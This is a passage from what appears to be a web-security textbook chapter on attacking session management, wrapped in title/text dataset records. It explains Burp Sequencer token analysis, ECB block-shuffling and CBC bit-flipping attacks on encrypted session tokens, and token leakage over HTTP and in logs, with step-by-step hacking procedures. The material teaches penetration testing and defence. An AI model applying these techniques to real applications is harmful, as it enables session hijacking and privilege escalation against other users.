also\ncc0077..iinndddd 221199 88//1199//22001111 1122::0077::4400 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 220\n220 Chapter 7 n Attacking Session Management\nconfi gure various options that affect how tokens are collected, and then click\nthe start capture button to begin capturing tokens. If you have already obtained\na suitable sample of tokens through other means (for example, by saving the\nresults of a Burp Intruder attack), you can use the manual load tab to skip the\ncapturing of tokens and proceed straight to the statistical analysis.\nFigure 7-2: Configuring Burp Sequencer to test the randomness of a session token\nWhen you have obtained a suitable sample of tokens, you can perform the\nstatistical analysis on the sample. You can also perform interim analyses while\nthe sample is still being captured. In general, obtaining a larger sample improves\nthe reliability of the analysis. The minimum sample size that Burp requires is\n100 tokens, but ideally you should obtain a much larger sample than this. If the\nanalysis of a few hundred tokens shows conclusively that the tokens fail the\nrandomness tests, you may reasonably decide that it is unnecessary to capture\nfurther tokens. Otherwise, you should continue capturing tokens and re-perform\nthe analysis periodically. If you capture 5,000 tokens that are shown to pass the\nrandomness tests, you may decide that this is suffi cient. However, to achieve\ncompliance with the formal FIPS tests for randomness, you need to obtain a\nsample of 20,000 tokens. This is the largest sample size that Burp supports.\nBurp Sequencer performs the statistical tests at character level and bit level.\nThe results of all tests are aggregated to give an overall estimate of the number\ncc0077..iinndddd 222200 88//1199//22001111 1122::0077::4400 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 221\nChapter 7 n Attacking Session Management 221\nof bits of effective entropy within the token; this the key result to consider.\nHowever, you can also drill down into the results of each test to understand\nexactly how and why different parts of the token passed or failed each test, as\nshown in Figure 7-3. The methodology used for each type of test is described\nbeneath the test results.\nFigure 7-3: Analyzing the Burp Sequencer results to understand the properties of\nthe tokens that were tested\nNote that Burp performs all tests individually on each character and bit of data\nwithin the token. In many cases, you will fi nd that large parts of a structured\ntoken are not random; this in itself may not present any kind of weakness. What\nmatters is that the token contains a suffi cient number of bits that do pass the\nrandomness tests. For example, if a large token contains 1,000 bits of informa-\ntion, and only 50 of these bits pass the randomness tests, the token as a whole\nis no less robust than a 50-bit token that fully passes the tests.\ncc0077..iinndddd 222211 88//1199//22001111 1122::0077::4400 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 222\n222 Chapter 7 n Attacking Session Management\nNOTE Keep in mind two important caveats when performing statisti-\ncal tests for randomness. These caveats affect the correct interpretation of\nthe test results and their consequences for the application’s security pos-\nture. First, tokens that are generated in a completely deterministic way may\npass the statistical tests for randomness. For example, a linear congruential\npseudorandom number generator, or an algorithm that computes the hash\nof a sequential number, may produce output that passes the tests. Yet an\nattacker who knows the algorithm and the internal state of the generator can\nextrapolate its output with complete reliability in both forward and reverse\ndirections.\nSecond, tokens that fail the statistical tests for randomness may not actu-\nally be predictable in any practical situation. If a given bit of a token fails the\ntests, this means only that the sequence of bits observed at that position con-\ntains characteristics that are unlikely to occur in a genuinely random token.\nBut attempting to predict the value of that bit in the next token, based on the\nobserved characteristics, may be little more reliable than blind guesswork.\nMultiplying this unreliability across a large number of bits that need to be\npredicted simultaneously may mean that the probability of making a correct\nprediction is extremely low.\nHACK STEPS\n1. Determine when and how session tokens are issued by walking through\nthe application from the first application page through any login func-\ntions. Two behaviors are common:\nn The application creates a new session anytime a request is received that\ndoes not submit a token.\nn The application creates a new session following a successful login.\nTo harvest large numbers of tokens in an automated way, ideally identify\na single request (typically either GET/ or a login submission) that causes\na new token to be issued.\n2. In Burp Suite, send the request that creates a new session to Burp\nSequencer, and configure the token’s location. Then start a live capture\nto gather as many tokens as is feasible. If a custom session management\nmechanism is in use, and you only have remote access to the application,\ngather the tokens as quickly as possible to minimize the loss of tokens\nissued to other users and reduce the influence of any time dependency.\n3. If a commercial session management mechanism is in use and/or you\nhave local access to the application, you can obtain indefinitely large\nsequences of session tokens in controlled conditions.\ncc0077..iinndddd 222222 88//1199//22001111 1122::0077::4411 PPMM"
  },
  {
    "input": "Encrypted Tokens",
    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 223\nChapter 7 n Attacking Session Management 223\n4. While Burp Sequencer is capturing tokens, enable the “auto analyse” set-\nting so that Burp automatically performs the statistical analysis periodi-\ncally. Collect at least 500 tokens before reviewing the results in any detail.\nIf a sufficient number of bits within the token have passed the tests,\ncontinue gathering tokens for as long as is feasible, reviewing the analysis\nresults as further tokens are captured.\n5. If the tokens fail the randomness tests and appear to contain patterns\nthat could be exploited to predict future tokens, reperform the exercise\nfrom a different IP address and (if relevant) a different username. This\nwill help you identify whether the same pattern is detected and whether\ntokens received in the first exercise could be extrapolated to identify\ntokens received in the second. Sometimes the sequence of tokens cap-\ntured by one user manifests a pattern. But this will not allow straight-\nforward extrapolation to the tokens issued to other users, because\ninformation such as source IP is used as a source of entropy (such as a\nseed to a random number generator).\n6. If you believe you have enough insight into the token generation algo-\nrithm to mount an automated attack against other users’ sessions, it is\nlikely that the best means of achieving this is via a customized script.\nThis can generate tokens using the specific patterns you have observed\nand apply any necessary encoding. See Chapter 14 for some generic tech-\nniques for applying automation to this type of problem.\n7. If source code is available, closely review the code responsible for gener-\nating session tokens to understand the mechanism used and determine\nwhether it is vulnerable to prediction. If entropy is drawn from data that\ncan be determined within the application within a brute-forcible range,\nconsider the practical number of requests that would be needed to brute-\nforce an application token.\nTRY IT!\nhttp://mdsec.net/auth/361/\nEncrypted Tokens\nSome applications use tokens that contain meaningful information about the\nuser and seek to avoid the obvious problems that this entails by encrypting the\ntokens before they are issued to users. Since the tokens are encrypted using a\nsecret key that is unknown to users, this appears to be a robust approach, because\nusers will be unable to decrypt the tokens and tamper with their contents.\ncc0077..iinndddd 222233 88//1199//22001111 1122::0077::4411 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 224\n224 Chapter 7 n Attacking Session Management\nHowever, in some situations, depending on the encryption algorithm used and\nthe manner in which the application processes the tokens, it may nonetheless be\npossible for users to tamper with the tokens’ meaningful contents without actu-\nally decrypting them. Bizarre as it may sound, these are actually viable attacks\nthat are sometimes easy to deliver, and numerous real-world applications have\nproven vulnerable to them. The kinds of attacks that are applicable depend on\nthe exact cryptographic algorithm that is being used.\nECB Ciphers\nApplications that employ encrypted tokens use a symmetric encryption algorithm\nso that tokens received from users can be decrypted to recover their meaningful\ncontents. Some symmetric encryption algorithms use an “electronic codebook”\n(ECB) cipher. This type of cipher divides plaintext into equal-sized blocks (such\nas 8 bytes each) and encrypts each block using the secret key. During decryp-\ntion, each block of ciphertext is decrypted using the same key to recover the\noriginal block of plaintext. One feature of this method is that patterns within the\nplaintext can result in patterns within the ciphertext, because identical blocks of\nplaintext will be encrypted into identical blocks of ciphertext. For some types\nof data, such as bitmap images, this means that meaningful information from\nthe plaintext can be discerned within the ciphertext, as illustrated in Figure 7-4.\nFigure 7-4: Patterns within plaintext that\nis encrypted using an ECB cipher may be\nvisible within the resulting ciphertext.\nIn spite of this shortcoming with ECB, these ciphers are often used for encrypt-\ning information within web applications. Even in situations where the problem\nof patterns within plaintext does not arise, vulnerabilities can still exist. This\nis because of the cipher’s behavior of encrypting identical plaintext blocks into\nidentical ciphertext blocks.\nConsider an application whose tokens contain several different meaningful\ncomponents, including a numeric user identifi er:\nrnd=2458992;app=iTradeEUR_1;uid=218;username=dafydd;time=634430423694715\n000;\ncc0077..iinndddd 222244 88//1199//22001111 1122::0077::4411 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 225\nChapter 7 n Attacking Session Management 225\nWhen this token is encrypted, it is apparently meaningless and is likely to pass\nall standard statistical tests for randomness:\n68BAC980742B9EF80A27CBBBC0618E3876FF3D6C6E6A7B9CB8FCA486F9E11922776F0307\n329140AABD223F003A8309DDB6B970C47BA2E249A0670592D74BCD07D51A3E150EFC2E69\n885A5C8131E4210F\nThe ECB cipher being employed operates on 8-byte blocks of data, and the\nblocks of plaintext map to the corresponding blocks of ciphertext as follows:\nrnd=2458 68BAC980742B9EF8\n992;app= 0A27CBBBC0618E38\niTradeEU 76FF3D6C6E6A7B9C\nR_1;uid= B8FCA486F9E11922\n218;user 776F0307329140AA\nname=daf BD223F003A8309DD\nydd;time B6B970C47BA2E249\n=6344304 A0670592D74BCD07\n23694715 D51A3E150EFC2E69\n000; 885A5C8131E4210F\nNow, because each block of ciphertext will always decrypt into the same\nblock of plaintext, it is possible for an attacker to manipulate the sequence of\nciphertext blocks so as to modify the corresponding plaintext in meaning-\nful ways. Depending on how exactly the application processes the resulting\ndecrypted token, this may enable the attacker to switch to a different user or\nescalate privileges.\nFor example, if the second block is duplicated following the fourth block, the\nsequence of blocks will be as follows:\nrnd=2458 68BAC980742B9EF8\n992;app= 0A27CBBBC0618E38\niTradeEU 76FF3D6C6E6A7B9C\nR_1;uid= B8FCA486F9E11922\n992;app= 0A27CBBBC0618E38\n218;user 776F0307329140AA\nname=daf BD223F003A8309DD\nydd;time B6B970C47BA2E249\n=6344304 A0670592D74BCD07\n23694715 D51A3E150EFC2E69\n000; 885A5C8131E4210F\nThe decrypted token now contains a modifi ed uid value, and also a duplicated\napp value. Exactly what happens depends on how the application processes\nthe decrypted token. Often, applications using tokens in this way inspect only\ncertain parts of the decrypted token, such as the user identifi er. If the applica-\ntion behaves like this, then it will process the request in the context of the user\nwho has a uid of 992, rather than the original 218.\ncc0077..iinndddd 222255 88//1199//22001111 1122::0077::4411 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 226\n226 Chapter 7 n Attacking Session Management\nThe attack just described would depend on being issued with a suitable rnd\nvalue that corresponds to a valid uid value when the blocks are manipulated.\nAn alternative and more reliable attack would be to register a username con-\ntaining a numeric value at the appropriate offset, and duplicate this block so as\nto replace the existing uid value. Suppose you register the username daf1, and\nare issued with the following token:\n9A5A47BF9B3B6603708F9DEAD67C7F4C76FF3D6C6E6A7B9CB8FCA486F9E11922A5BC430A\n73B38C14BD223F003A8309DDF29A5A6F0DC06C53905B5366F5F4684C0D2BBBB08BD834BB\nADEBC07FFE87819D\nThe blocks of plaintext and ciphertext for this token are as follows:\nrnd=9224 9A5A47BF9B3B6603\n856;app= 708F9DEAD67C7F4C\niTradeEU 76FF3D6C6E6A7B9C\nR_1;uid= B8FCA486F9E11922\n219;user A5BC430A73B38C14\nname=daf BD223F003A8309DD\n1;time=6 F29A5A6F0DC06C53\n34430503 905B5366F5F4684C\n61065250 0D2BBBB08BD834BB\n0; ADEBC07FFE87819D\nIf you then duplicate the seventh block following the fourth block, your\ndecrypted token will contain a uid value of 1:\nrnd=9224 9A5A47BF9B3B6603\n856;app= 708F9DEAD67C7F4C\niTradeEU 76FF3D6C6E6A7B9C\nR_1;uid= B8FCA486F9E11922\n1;time=6 F29A5A6F0DC06C53\n219;user A5BC430A73B38C14\nname=daf BD223F003A8309DD\n1;time=6 F29A5A6F0DC06C53\n34430503 905B5366F5F4684C\n61065250 0D2BBBB08BD834BB\n0; ADEBC07FFE87819D\nBy registering a suitable range of usernames and reperforming this attack,\nyou could potentially cycle through the entire range of valid uid values, and\nso masquerade as every user of the application.\nTRY IT!\nhttp://mdsec.net/auth/363/\ncc0077..iinndddd 222266 88//1199//22001111 1122::0077::4411 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 227\nChapter 7 n Attacking Session Management 227\nCBC Ciphers\nThe shortcomings in ECB ciphers led to the development of cipher block chaining\n(CBC) ciphers. With a CBC cipher, before each block of plaintext is encrypted\nit is XORed against the preceding block of ciphertext, as shown in Figure 7-5.\nThis prevents identical plaintext blocks from being encrypted into identical\nciphertext blocks. During decryption, the XOR operation is applied in reverse,\nand each decrypted block is XORed against the preceding block of ciphertext\nto recover the original plaintext.\nPlaintext Plaintext Plaintext\nInitialization Vector (IV)\nBlock Cipher Block Cipher Block Cipher\nKey Key Key\nEncryption Encryption Encryption\nCiphertext Ciphertext Ciphertext\nFigure 7-5: In a CBC cipher, each block of plaintext is XORed against the preceding\nblock of ciphertext before being encrypted.\nBecause CBC ciphers avoid some of the problems with ECB ciphers, standard\nsymmetric encryption algorithms such as DES and AES frequently are used\nin CBC mode. However, the way in which CBC-encrypted tokens are often\nemployed in web applications means that an attacker may be able to manipulate\nparts of the decrypted tokens without knowing the secret key.\nConsider a variation on the preceding application whose tokens contain\nseveral different meaningful components, including a numeric user identifi er:\nrnd=191432758301;app=eBankProdTC;uid=216;time=6343303;\nAs before, when this information is encrypted, it results in an apparently mean-\ningless token:\n0FB1F1AFB4C874E695AAFC9AA4C2269D3E8E66BBA9B2829B173F255D447C51321586257C\n6E459A93635636F45D7B1A43163201477\nBecause this token is encrypted using a CBC cipher, when the token is decrypted,\neach block of ciphertext is XORed against the following block of decrypted text\nto obtain the plaintext. Now, if an attacker modifi es parts of the ciphertext (the\ntoken he received), this causes that specifi c block to decrypt into junk. However, it\nalso causes the following block of decrypted text to be XORed against a different\ncc0077..iinndddd 222277 88//1199//22001111 1122::0077::4411 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 228\n228 Chapter 7 n Attacking Session Management\nvalue, resulting in modifi ed but still meaningful plaintext. In other words, by\nmanipulating a single individual block of the token, the attacker can systemati-\ncally modify the decrypted contents of the block that follows it. Depending on\nhow the application processes the resulting decrypted token, this may enable\nthe attacker to switch to a different user or escalate privileges.\nLet’s see how. In the example described, the attacker works through the\nencrypted token, changing one character at a time in arbitrary ways and send-\ning each modifi ed token to the application. This involves a large number of\nrequests. The following is a selection of the values that result when the applica-\ntion decrypts each modifi ed token:\n????????32858301;app=eBankProdTC;uid=216;time=6343303;\n????????32758321;app=eBankProdTC;uid=216;time=6343303;\nrnd=1914????????;aqp=eBankProdTC;uid=216;time=6343303;\nrnd=1914????????;app=eAankProdTC;uid=216;time=6343303;\nrnd=191432758301????????nkPqodTC;uid=216;time=6343303;\nrnd=191432758301????????nkProdUC;uid=216;time=6343303;\nrnd=191432758301;app=eBa????????;uie=216;time=6343303;\nrnd=191432758301;app=eBa????????;uid=226;time=6343303;\nrnd=191432758301;app=eBankProdTC????????;timd=6343303;\nrnd=191432758301;app=eBankProdTC????????;time=6343503;\nIn each case, the block that the attacker has modifi ed decrypts into junk, as\nexpected (indicated by ????????). However, the following block decrypts into\nmeaningful text that differs slightly from the original token. As already described,\nthis difference occurs because the decrypted text is XORed against the preced-\ning block of ciphertext, which the attacker has slightly modifi ed.\nAlthough the attacker does not see the decrypted values, the application\nattempts to process them, and the attacker sees the results in the application’s\nresponses. Exactly what happens depends on how the application handles the\npart of the decrypted token that has been corrupted. If the application rejects\ntokens containing any invalid data, the attack fails. Often, however, applica-\ntions using tokens in this way inspect only certain parts of the decrypted\ntoken, such as the user identifi er. If the application behaves like this, then\nthe eighth example shown in the preceding list succeeds, and the application\nprocesses the request in the context of the user who has a uid of 226, rather\nthan the original 216.\nYou can easily test applications for this vulnerability using the “bit fl ip-\nper” payload type in Burp Intruder. First, you need to log in to the applica-\ntion using your own account. Then you fi nd a page of the application that\ndepends on a logged-in session and shows the identity of the logged-in user\nwithin the response. Typically, the user’s home landing page or account details\npage serves this purpose. Figure 7-6 shows Burp Intruder set up to target the\nuser’s home page, with the encrypted session token marked as a payload\nposition.\ncc0077..iinndddd 222288 88//1199//22001111 1122::0077::4411 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 229\nChapter 7 n Attacking Session Management 229\nFigure 7-6: Configuring Burp Intruder to modify an encrypted session token\nFigure 7-7 shows the required payload confi guration. It tells Burp to oper-\nate on the token’s original value, treating it as ASCII-encoded hex, and to fl ip\neach bit at each character position. This approach is ideal because it requires a\nrelatively small number of requests (eight requests per byte of data in the token)\nand almost always identifi es whether the application is vulnerable. This allows\nyou to use a more focused attack to perform actual exploitation.\nWhen the attack is executed, the initial requests do not cause any noticeable\nchange in the application’s responses, and the user’s session is still intact. This\nis interesting in itself, because it indicates that the fi rst part of the token is not\nbeing used to identify the logged-in user. Many of the requests later in the attack\ncause a redirection to the login page, indicating that modifi cation has invali-\ndated the token in some way. Crucially, there is also a run of requests where\nthe response appears to be part of a valid session but is not associated with the\noriginal user identity. This corresponds to the block of the token that contains\nthe uid value. In some cases, the application simply displays “unknown user,”\nindicating that the modifi ed uid did not correspond to an actual user, and so the\nattack failed. In other cases, it shows the name of a different registered user of\nthe application, proving conclusively that the attack has succeeded. Figure 7-8\nshows the results of the attack. Here we have defi ned an extract grep column\nto display the identity of the logged-in user and have set a fi lter to hide the\nresponses that are redirections to the login page.\ncc0077..iinndddd 222299 88//1199//22001111 1122::0077::4411 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 230\n230 Chapter 7 n Attacking Session Management\nFigure 7-7: Configuring Burp Intruder to flip each bit in the encrypted token\nFigure 7-8: A successful bit flipping attack against an encrypted token\ncc0077..iinndddd 223300 88//1199//22001111 1122::0077::4422 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 231\nChapter 7 n Attacking Session Management 231\nHaving identifi ed the vulnerability, you can proceed to exploit it with a more\nfocused attack. To do this, you would determine from the results exactly which\nblock of the encrypted token is being tampered with when the user context\nchanges. Then you would deliver an attack that tests numerous further val-\nues within this block. You could use the numbers payload type within Burp\nIntruder to do this.\nTRY IT!\nhttp://mdsec.net/auth/365/\nNOTE Some applications use the technique of encrypting meaningful data\nwithin request parameters more generally in an attempt to prevent tampering\nof data, such as the prices of shopping items. In any location where you see\napparently encrypted data that plays a key role in application functionality, you\nshould try the bit-fl ipping technique to see whether you can manipulate the\nencrypted information in a meaningful way to interfere with application logic.\nIn seeking to exploit the vulnerability described in this section, your objec-\ntive would of course be to masquerade as different application users — ideally\nan administrative user with higher privileges. If you are restricted to blindly\nmanipulating parts of an encrypted token, this may require a degree of luck.\nHowever, in some cases the application may give you more assistance. When\nan application employs symmetric encryption to protect data from tampering\nby users, it is common for the same encryption algorithm and key to be used\nthroughout the application. In this situation, if any application function discloses\nto the user the decrypted value of an arbitrary encrypted string, this can be\nleveraged to fully decrypt any item of protected information.\nOne application observed by the authors contained a fi le upload/download\nfunction. Having uploaded a fi le, users were given a download link containing\na fi lename parameter. To prevent various attacks that manipulate fi le paths, the\napplication encrypted the fi lename within this parameter. However, if a user\nrequested a fi le that had been deleted, the application displayed an error mes-\nsage showing the decrypted name of the requested fi le. This behavior could be\nleveraged to fi nd the plaintext value of any encrypted string used within the\napplication, including the values of session tokens. The session tokens were\nfound to contain various meaningful values in a structured format that was\nvulnerable to the type of attack described in this section. Because these values\nincluded textual usernames and application roles, rather than numeric identi-\nfi ers, it would have been extremely diffi cult to perform a successful exploit using\nonly blind bit fl ipping. However, using the fi lename decryptor function, it was\npossible to systematically manipulate bits of a token while viewing the results.\ncc0077..iinndddd 223311 88//1199//22001111 1122::0077::4422 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 232\n232 Chapter 7 n Attacking Session Management\nThis allowed the construction of a token that, when decrypted, specifi ed a valid\nuser and administrative role, enabling full control of the application.\nNOTE Other techniques may allow you to decrypt encrypted data used by\nthe application. A “reveal” encryption oracle can be abused to obtain the\ncleartext value of an encrypted token. Although this can be a signifi cant\nvulnerability when decrypting a password, decrypting a session token does\nnot provide an immediate means of compromising other users’ sessions.\nNevertheless, the decrypted token provides useful insight into the cleartext\nstructure, which is useful in conducting a targeted bit-fl ipping attack. See\nChapter 11 for more details about “reveal” encryption oracle attacks.\nSide channel attacks against padding oracles may be used to compromise\nencrypted tokens. See Chapter 18 for more details.\nHACK STEPS\nIn many situations where encrypted tokens are used, actual exploitability may\ndepend on various factors, including the offsets of block boundaries relative\nto the data you need to attack, and the application’s tolerance of the changes\nthat you cause to the surrounding plaintext structure. Working completely\nblind, it may appear diffi cult to construct an effective attack, however in many\nsituations this is in fact possible.\n1. Unless the session token is obviously meaningful or sequential in itself,\nalways consider the possibility that it might be encrypted. You can often\nidentify that a block-based cipher is being used by registering several dif-\nferent usernames and adding one character in length each time. If you\nfind a point where adding one character results in your session token\njumping in length by 8 or 16 bytes, then a block cipher is probably being\nused. You can confirm this by continuing to add bytes to your username,\nand looking for the same jump occurring 8 or 16 bytes later.\n2. ECB cipher manipulation vulnerabilities are normally difficult to identify\nand exploit in a purely black-box context. You can try blindly duplicat-\ning and moving the ciphertext blocks within your token, and reviewing\nwhether you remain logged in to the application within your own user\ncontext, or that of another user, or none at all.\n3. You can test for CBC cipher manipulation vulnerabilities by running a Burp\nIntruder attack over the whole token, using the “bit flipping” payload\nsource. If the bit flipping attack identifies a section within the token, the\nmanipulation of which causes you to remain in a valid session, but as a\ndifferent or nonexistent user, perform a more focused attack on just this\nsection, trying a wider range of values at each position.\ncc0077..iinndddd 223322 88//1199//22001111 1122::0077::4422 PPMM"
  },
  {
    "input": "Weaknesses in Session Token Handling",
    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 233\nChapter 7 n Attacking Session Management 233\n4. During both attacks, monitor the application’s responses to identify the\nuser associated with your session following each request, and try to\nexploit any opportunities for privilege escalation that may result.\n5. If your attacks are unsuccessful, but it appears from step 1 that variable-\nlength input that you control is being incorporated into the token, you\nshould try generating a series of tokens by adding one character at a time,\nat least up to the size of blocks being used. For each resulting token, you\nshould reperform steps 2 and 3. This will increase the chance that the\ndata you need to modify is suitably aligned with block boundaries for\nyour attack to succeed.\nWeaknesses in Session Token Handling\nNo matter how effective an application is at ensuring that the session tokens it\ngenerates do not contain any meaningful information and are not susceptible\nto analysis or prediction, its session mechanism will be wide open to attack if\nthose tokens are not handled carefully after generation. For example, if tokens\nare disclosed to an attacker via some means, the attacker can hijack user ses-\nsions even if predicting the tokens is impossible.\nAn application’s unsafe handling of tokens can make it vulnerable to attack\nin several ways.\nCOMMON MYTH\n“Our token is secure from disclosure to third parties because we use SSL.”\nProper use of SSL certainly helps protect session tokens from being cap-\ntured. But various mistakes can still result in tokens being transmitted in\ncleartext even when SSL is in place. And various direct attacks against end\nusers can be used to obtain their tokens.\nCOMMON MYTH\n“Our token is generated by the platform using mature, cryptographically\nsound technologies, so it is not vulnerable to compromise.”\nAn application server’s default behavior is often to create a session cookie\nwhen the user fi rst visits the site and to keep this available for the user’s\nentire interaction with the site. As described in the following sections, this\nmay lead to various security vulnerabilities in how the token is handled.\ncc0077..iinndddd 223333 88//1199//22001111 1122::0077::4422 PPMM"
  },
  {
    "input": "Disclosure of Tokens on the Network",
    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 234\n234 Chapter 7 n Attacking Session Management\nDisclosure of Tokens on the Network\nThis area of vulnerability arises when the session token is transmitted across\nthe network in unencrypted form, enabling a suitably positioned eavesdropper\nto obtain the token and therefore masquerade as the legitimate user. Suitable\npositions for eavesdropping include the user’s local network, within the user’s IT\ndepartment, within the user’s ISP, on the Internet backbone, within the application’s\nISP, and within the IT department of the organization hosting the application. In\neach case, this includes both authorized personnel of the relevant organization\nand any external attackers who have compromised the infrastructure concerned.\nIn the simplest case, where an application uses an unencrypted HTTP connec-\ntion for communications, an attacker can capture all data transmitted between\nclient and server, including login credentials, personal information, payment\ndetails, and so on. In this situation, an attack against the user’s session is often\nunnecessary because the attacker can already view privileged information\nand can log in using captured credentials to perform other malicious actions.\nHowever, there may still be instances where the user’s session is the primary\ntarget. For example, if the captured credentials are insuffi cient to perform a\nsecond login (for example, in a banking application, they may include a number\ndisplayed on a changing physical token, or specifi c digits from the user’s PIN),\nthe attacker may need to hijack the eavesdropped session to perform arbitrary\nactions. Or if logins are audited closely, and the user is notifi ed of each suc-\ncessful login, an attacker may want to avoid performing his own login to be as\nstealthy as possible.\nIn other cases, an application may use HTTPS to protect key client-server\ncommunications yet may still be vulnerable to interception of session tokens\non the network. This weakness may occur in various ways, many of which can\narise specifi cally when HTTP cookies are used as the transmission mechanism\nfor session tokens:\nn Some applications elect to use HTTPS to protect the user’s credentials\nduring login but then revert to HTTP for the remainder of the user’s ses-\nsion. Many web mail applications behave in this way. In this situation, an\neavesdropper cannot intercept the user’s credentials but may still capture\nthe session token. The Firesheep tool, released as a plug-in for Firefox,\nmakes this an easy process.\nn Some applications use HTTP for preauthenticated areas of the site, such\nas the site’s front page, but switch to HTTPS from the login page onward.\nHowever, in many cases the user is issued a session token at the fi rst page\nvisited, and this token is not modifi ed when the user logs in. The user’s\nsession, which is originally unauthenticated, is upgraded to an authenti-\ncated session after login. In this situation an eavesdropper can intercept a\nuser’s token before login, wait for the user’s communications to switch to\ncc0077..iinndddd 223344 88//1199//22001111 1122::0077::4422 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 235\nChapter 7 n Attacking Session Management 235\nHTTPS, indicating that the user is logging in, and then attempt to access\na protected page (such as My Account) using that token.\nn Even if the application issues a fresh token following successful login,\nand uses HTTPS from the login page onward, the token for the user’s\nauthenticated session may still be disclosed. This can happen if the user\nrevisits a preauthentication page (such as Help or About), either by fol-\nlowing links within the authenticated area, by using the back button, or\nby typing the URL directly.\nn In a variation on the preceding case, the application may attempt to switch\nto HTTPS when the user clicks the Login link. However, it may still accept\na login over HTTP if the user modifi es the URL accordingly. In this situa-\ntion, a suitably positioned attacker can modify the pages returned in the\npreauthenticated areas of the site so that the Login link points to an HTTP\npage. Even if the application issues a fresh session token after success-\nful login, the attacker may still intercept this token if he has successfully\ndowngraded the user’s connection to HTTP.\nn Some applications use HTTP for all static content within the application,\nsuch as images, scripts, style sheets, and page templates. This behavior\nis often indicated by a warning within the user’s browser, as shown in\nFigure 7-9. When a browser shows this warning, it has already retrieved\nthe relevant item over HTTP, so the session token has already been trans-\nmitted. The purpose of the browser’s warning is to let the user decline\nto process response data that has been received over HTTP and so may\nbe tainted. As described previously, an attacker can intercept the user’s\nsession token when the user’s browser accesses a resource over HTTP and\nuse this token to access protected, nonstatic areas of the site over HTTPS.\nFigure 7-9: Browsers present a warning when a\npage accessed over HTTPS contains items accessed\nover HTTP.\nn Even if an application uses HTTPS for every page, including unauthenti-\ncated areas of the site and static content, there may still be circumstances\nin which users’ tokens are transmitted over HTTP. If an attacker can\nsomehow induce a user to make a request over HTTP (either to the HTTP\ncc0077..iinndddd 223355 88//1199//22001111 1122::0077::4422 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 236\n236 Chapter 7 n Attacking Session Management\nservice on the same server if one is running or to http://server:443/\notherwise), his token may be submitted. Means by which the attacker\nmay attempt this include sending the user a URL in an e-mail or instant\nmessage, placing autoloading links into a website the attacker controls,\nor using clickable banner ads. (See Chapters 12 and 13 for more details\nabout techniques of this kind for delivering attacks against other users.)\nHACK STEPS\n1. Walk through the application in the normal way from first access (the\n“start” URL), through the login process, and then through all of the appli-\ncation’s functionality. Keep a record of every URL visited, and note every\ninstance in which a new session token is received. Pay particular atten-\ntion to login functions and transitions between HTTP and HTTPS com-\nmunications. This can be achieved manually using a network sniffer such\nas Wireshark or partially automated using the logging functions of your\nintercepting proxy, as shown in Figure 7-10.\nFigure 7-10: Walking through an application to identify locations where new\nsession tokens are received.\n2. If HTTP cookies are being used as the transmission mechanism for session\ntokens, verify whether the secure flag is set, preventing them from ever\nbeing transmitted over unencrypted connections.\n3. Determine whether, in the normal use of the application, session tokens\nare ever transmitted over an unencrypted connection. If so, they should be\nregarded as vulnerable to interception.\n4. Where the start page uses HTTP, and the application switches to HTTPS\nfor the login and authenticated areas of the site, verify whether a new\ntoken is issued following login, or whether a token transmitted during the\nHTTP stage is still being used to track the user’s authenticated session.\nAlso verify whether the application will accept login over HTTP if the login\nURL is modified accordingly.\ncc0077..iinndddd 223366 88//1199//22001111 1122::0077::4433 PPMM"
  },
  {
    "input": "Disclosure of Tokens in Logs",
    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 237\nChapter 7 n Attacking Session Management 237\n5. Even if the application uses HTTPS for every page, verify whether the\nserver is also listening on port 80, running any service or content. If so,\nvisit any HTTP URL directly from within an authenticated session, and\nverify whether the session token is transmitted.\n6. In cases where a token for an authenticated session is transmitted to the\nserver over HTTP, verify whether that token continues to be valid or is\nimmediately terminated by the server.\nTRY IT!\nhttp://mdsec.net/auth/369/\nhttp://mdsec.net/auth/372/\nhttp://mdsec.net/auth/374/\nDisclosure of Tokens in Logs\nAside from the clear-text transmission of session tokens in network communica-\ntions, the most common place where tokens are simply disclosed to unauthorized\nview is in system logs of various kinds. Although it is a rarer occurrence, the\nconsequences of this kind of disclosure are usually more serious. Those logs\nmay be viewed by a far wider range of potential attackers, not just by someone\nwho is suitably positioned to eavesdrop on the network.\nMany applications provide functionality for administrators and other sup-\nport personnel to monitor and control aspects of the application’s runtime state,\nincluding user sessions. For example, a helpdesk worker assisting a user who is\nhaving problems may ask for her username, locate her current session through\na list or search function, and view relevant details about the session. Or an\nadministrator may consult a log of recent sessions in the course of investigat-\ning a security breach. Often, this kind of monitoring and control functionality\ndiscloses the actual session token associated with each session. And often, the\nfunctionality is poorly protected, allowing unauthorized users to access the list\nof current session tokens, and thereby hijack the sessions of all application users.\nThe other main cause of session tokens appearing in system logs is where an\napplication uses the URL query string as a mechanism for transmitting tokens,\nas opposed to using HTTP cookies or the body of POST requests. For example,\nGoogling inurl:jsessionid identifi es thousands of applications that transmit\nthe Java platform session token (called jsessionid) within the URL:\nhttp://www.webjunction.org/do/Navigation;jsessionid=\nF27ED2A6AAE4C6DA409A3044E79B8B48?category=327\ncc0077..iinndddd 223377 88//1199//22001111 1122::0077::4433 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 238\n238 Chapter 7 n Attacking Session Management\nWhen applications transmit their session tokens in this way, it is likely that\ntheir session tokens will appear in various system logs to which unauthorized\nparties may have access:\nn Users’ browser logs\nn Web server logs\nn Logs of corporate or ISP proxy servers\nn Logs of any reverse proxies employed within the application’s hosting\nenvironment\nn The Referer logs of any servers that application users visit by following\noff-site links, as shown in Figure 7-11\nSome of these vulnerabilities arise even if HTTPS is used throughout the\napplication.\nFigure 7-11: When session tokens appear in URLs, these are transmitted in the\nReferer header when users follow an off-site link or their browser loads an off-\nsite resource.\nThe fi nal case just described presents an attacker with a highly 